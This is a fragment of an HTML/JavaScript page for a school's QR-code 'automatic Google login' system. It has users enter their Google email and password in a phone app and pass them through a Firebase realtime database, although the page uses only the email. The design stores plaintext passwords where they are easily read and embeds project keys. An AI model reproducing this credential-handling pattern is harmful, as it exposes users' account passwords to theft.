        .instructions li {

        .status {
            padding: 15px;
            border-radius: 8px;
            margin-top: 20px;
            font-weight: bold;
        }
        .waiting {
            background-color: #fff3cd;
            color: #856404;
        }
        .connected {
            background-color: #d4edda;
            color: #155724;
        }
        .error {

            color: #721c24;
        }
        .google-logo {
            width: 100px;
            margin-bottom: 20px;
        }
        .school-logo {
            width: 80px;
            margin-bottom: 10px;
        }
        .footer {
            margin-top: 30px;
            color: #666;
            font-size: 14px;
        }
        #refreshBtn {
            background-color: #f1f1f1;
            color: #333;
            border: none;
            padding: 10px 20px;
            border-radius: 4px;
            cursor: pointer;
            font-weight: bold;
            display: none;
            margin-top: 15px;
        }
    </style>
</head>
<body>

        <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZD0iTTEyIDIxLjM1bC0xLjQ1LTEuMzJDNS40IDE1LjM2IDIgMTIuMjggMiA4LjUgMiA1LjQyIDQuNDIgMyA3LjUgM2MxLjc0IDAgMy40MS44MSA0LjUgMi4wOUMxMy4wOSAzLjgxIDE0Ljc2IDMgMTYuNSAzIDE5LjU4IDMgMjIgNS40MiAyMiA4LjVjMCAzLjc4LTMuNCA2Ljg2LTguNTUgMTEuNTRMMTIgMjEuMzV6IiBmaWxsPSIjRjQ0MzM2Ii8+PC9zdmc+" alt="營北國中" class="school-logo">
        <h1>營北國中自動登入GOOGLE系統</h1>
        
        <div class="instructions">
            <h2>使用說明</h2>
            <ol>
                <li>請使用手機開啟營北國中Google登入手機應用程式</li>
                <li>在手機上輸入並儲存您的Google帳號與密碼</li>
                <li>點擊「掃描 QR Code」按鈕</li>
                <li>掃描下方的 QR Code</li>
                <li>掃描成功後，系統將自動為您登入Google</li>

        <div class="qr-container">
            <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxNTAgMTUwIj48ZyBmaWxsPSJub25lIiBmaWxsLXJ1bGU9Im5vbnplcm8iPjxwYXRoIGZpbGw9IiNFQTQzMzUiIGQ9Ik0xMjAgNzYuMWMwLTMuMS0uMy01LjMtLjgtNy42SDc2LjF2MTQuNGgzMS45Yy0xLjQgNy42LTUuNiAxNC0xMS45IDE4LjN2MTUuMmgxOS4zYzExLjMtMTAuNCAxNy44LTI1LjcgMTcuOC00MC4zeiIvPjxwYXRoIGZpbGw9IiM0Mjg1RjQiIGQ9Ik03Ni4xIDEyMGMxNi4xIDAgMjkuNi01LjIgMzkuNC0xNC4xbC0xOS4zLTE1LjJjLTUuMyAzLjYtMTIuMSA1LjYtMjAuMSA1LjYtMTUuNSAwLTI4LjYtMTAuNS0zMy4zLTI0LjVIMjIuN3YxNS43YzkuNyAxOS4zIDI5LjEgMzIuNSA1My40IDMyLjV6Ii8+PHBhdGggZmlsbD0iI0ZCQkMwNSIgZD0iTTQyLjggNzEuOGMtMS4yLTMuNi0xLjgtNy41LTEuOC0xMS40IDAtMy45LjctNy44IDEuOC0xMS40VjMzLjNIMjIuN2MtNC44IDkuNS03LjUgMjAuMi03LjUgMzEuNiAwIDExLjMgMi43IDIyLjEgNy41IDMxLjZsMjAuMS0xNS43eiIvPjxwYXRoIGZpbGw9IiMzNEE4NTMiIGQ9Ik03Ni4xIDQzLjRjOC43IDAgMTYuNCAzLjEgMjIuNiA5LjFsMTcuMi0xNy4yQzEwNS4zIDI2LjEgOTEuOCAxOSA3Ni4xIDE5Yy0yNC4zIDAtNDUuNyAxMy4yLTU1LjQgMzIuM2wyMC4xIDE1LjdjNC43LTE0IDEyLjgtMjkuNiAyOC4zLTI5LjZ6Ii8+PC9nPjwvc3ZnPg==" alt="Google" class="google-logo">
            <div id="qrcode"></div>
            <div id="status" class="status waiting">等待手機掃描...</div>
            <button id="refreshBtn">重新產生QR碼</button>
        </div>
        
        <div class="footer">

    </div>

    <script>
        document.addEventListener('DOMContentLoaded', () => {
            // Firebase 設定 - 使用與mobile.html相同的配置
            const firebaseConfig = {
                apiKey: "AIzaSyArF8xncLwA3osSQ_o6yWIyuOc0TMrXRTY",
                authDomain: "yingpei--login.firebaseapp.com",
                databaseURL: "https://yingpei--login-default-rtdb.firebaseio.com",
                projectId: "yingpei--login",
                storageBucket: "yingpei--login.firebasestorage.app",
                messagingSenderId: "261477282402",
                appId: "1:261477282402:web:557f0be058e07cd642173b",
                measurementId: "G-EB9PR17TJL"
            };
            
            // 初始化 Firebase
            firebase.initializeApp(firebaseConfig);
            const database = firebase.database();
            
            // 產生連線 ID
            let connectionId = generateConnectionId();
            
            // 產生 QR 碼
            generateQRCode(connectionId);
            
            // 監聽 Firebase 資料庫更新
            startListening(connectionId);
            
            // 重新整理按鈕事件
            document.getElementById('refreshBtn').addEventListener('click', () => {
                // 移除舊的監聽器
                database.ref('connections/' + connectionId).off();
                
                // 產生新的連線 ID
                connectionId = generateConnectionId();
                
                // 生成新的 QR 碼
                document.getElementById('qrcode').innerHTML = '';
                generateQRCode(connectionId);
                
                // 重新開始監聽
                startListening(connectionId);
                
                // 更新狀態
                const statusElement = document.getElementById('status');
                statusElement.textContent = '等待手機掃描...';
                statusElement.className = 'status waiting';
                
                // 隱藏重新整理按鈕
                document.getElementById('refreshBtn').style.display = 'none';
            });
            
            // 產生連線 ID
            function generateConnectionId() {
                return 'conn-' + Math.random().toString(36).substring(2, 10);
            }
            
            // 產生 QR 碼
            function generateQRCode(connectionId) {
                new QRCode(document.getElementById("qrcode"), {
                    text: connectionId,
                    width: 200,
                    height: 200,
                    colorDark: "#000000",
                    colorLight: "#ffffff",
                    correctLevel: QRCode.CorrectLevel.H
                });
            }
            
            // 監聽來自手機的登入資料
            function startListening(connectionId) {
                const statusElement = document.getElementById('status');
                const connectionRef = database.ref('connections/' + connectionId);
                
                // 設定連線超時
                const timeout = setTimeout(() => {
                    statusElement.textContent = '連線逾時，請重新整理QR碼';
                    statusElement.className = 'status error';
                    document.getElementById('refreshBtn').style.display = 'inline-block';
                }, 180000); // 3分鐘超時
                
                // 監聽資料更新
                connectionRef.on('value', (snapshot) => {
                    const data = snapshot.val();
                    
                    if (data && data.email && data.password) {
                        // 清除超時計時器
                        clearTimeout(timeout);
                        
                        statusElement.textContent = '已接收登入資料，正在登入 Google...';
                        statusElement.className = 'status connected';
                        
                        // 更新狀態為處理中
                        connectionRef.update({
                            status: 'processing',
                            processingStartTime: Date.now()
                        });
                        
                        // 使用 Google OAuth 2.0 登入
                        googleSignIn(data.email, connectionRef);
                    }
                });
            }
            
            // 使用 Google OAuth 2.0 登入
            function googleSignIn(email, connectionRef) {
                const statusElement = document.getElementById('status');
                
                // 等待 Google API 載入
                gapi.load('auth2', () => {
                    gapi.auth2.init({
                        client_id: '130403455153-cdmr57ri7qh3s6c8riul6q6hsi3arjf8.apps.googleusercontent.com',
                        scope: 'profile email https://www.googleapis.com/auth/drive.readonly'
                    }).then(() => {
                        // 嘗試自動登入，使用者需要在彈出視窗中確認
                        const auth2 = gapi.auth2.getAuthInstance();
                        
                        // 預填 email
                        const options = {
                            prompt: 'select_account',
                            login_hint: email
                        };
                        
                        auth2.signIn(options).then(
                            (googleUser) => {
                                // 登入成功
                                const profile = googleUser.getBasicProfile();
                                statusElement.textContent = `登入成功！歡迎 ${profile.getName()}`;
                                statusElement.className = 'status connected';
                                
                                // 獲取OAuth Token (可用於後續API呼叫)
                                const authResponse = googleUser.getAuthResponse();
                                const token = authResponse.access_token;
                                const expiresAt = authResponse.expires_at;
                                
                                // 更新Firebase狀態，但不包含token (避免安全風險)
                                connectionRef.update({
                                    status: 'success',
                                    loggedInUser: profile.getName(),
                                    loggedInEmail: profile.getEmail(),
                                    profileImageUrl: profile.getImageUrl(),
                                    loggedInTime: new Date().toISOString(),
                                    redirectUrl: 'https://www.google.com',
                                    tokenExpiresAt: expiresAt
                                });
                                
                                // 延遲後重定向到 Google 服務
                                setTimeout(() => {
                                    window.location.href = 'https://www.google.com';
                                }, 3000);
                            },
                            (error) => {
                                // 登入失敗
                                statusElement.textContent = '登入失敗，請重試';
                                statusElement.className = 'status error';
                                console.error('Login failed:', error);
                                
                                // 更新Firebase狀態
                                connectionRef.update({
                                    status: 'error',
                                    errorMessage: error.error || '登入過程中發生錯誤',
                                    errorTime: new Date().toISOString()
                                });
                                
                                // 顯示重新整理按鈕
                                document.getElementById('refreshBtn').style.display = 'inline-block';
                            }
                        );
                    }).catch(error => {
                        // Google API 初始化失敗
                        statusElement.textContent = '無法初始化Google登入，請檢查網路連線';
                        statusElement.className = 'status error';
                        console.error('Google API initialization failed:', error);
                        
                        // 更新Firebase狀態
                        connectionRef.update({
                            status: 'error',
                            errorMessage: 'Google API初始化失敗',
                            errorTime: new Date().toISOString()
                        });
                        
                        // 顯示重新整理按鈕
                        document.getElementById('refreshBtn').style.display = 'inline-block';
                    });
                });
            }
        });
    </script>
</body>
</html>
